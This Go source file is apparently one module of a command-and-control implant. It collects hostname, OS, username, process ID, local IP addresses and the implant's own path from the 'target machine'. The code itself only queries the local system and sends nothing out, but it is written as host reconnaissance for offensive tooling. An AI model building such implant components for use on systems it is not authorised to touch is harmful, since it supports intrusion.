package implant

import (
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
)

// SysInfo holds collected system information.
type SysInfo struct {
	Hostname string
	OS       string
	Arch     string
	Username string
	PID      uint32
	LocalIPs []string
	ExePath  string // full path to the implant executable
	ExeDir   string // directory containing the implant executable
}

// GatherSysInfo collects system information from the target machine.
func GatherSysInfo() *SysInfo {
	info := &SysInfo{
		OS:   runtime.GOOS,
		Arch: runtime.GOARCH,
		PID:  uint32(os.Getpid()),
	}

	if hostname, err := os.Hostname(); err == nil {
		info.Hostname = hostname
	} else {
		info.Hostname = "unknown"
	}

	if u, err := user.Current(); err == nil {
		info.Username = u.Username
	} else {
		info.Username = "unknown"
	}

	// Gather non-loopback IPs
	info.LocalIPs = gatherIPs()

	// Get the executable's landing directory
	if exe, err := os.Executable(); err == nil {
		info.ExePath = exe
		info.ExeDir = filepath.Dir(exe)
	} else if len(os.Args) > 0 {
		info.ExePath = os.Args[0]
		info.ExeDir = filepath.Dir(os.Args[0])
	} else {
		info.ExeDir, _ = os.Getwd()
		info.ExePath = info.ExeDir
	}

	return info
}

func gatherIPs() []string {
	var ips []string

	ifaces, err := net.Interfaces()
	if err != nil {
		return ips
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue
		}
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			default:
				continue
			}

			if ip.IsLoopback() {
				continue
			}

			if ip4 := ip.To4(); ip4 != nil {
				ips = append(ips, ip4.String())
			}
		}
	}

	return ips
}
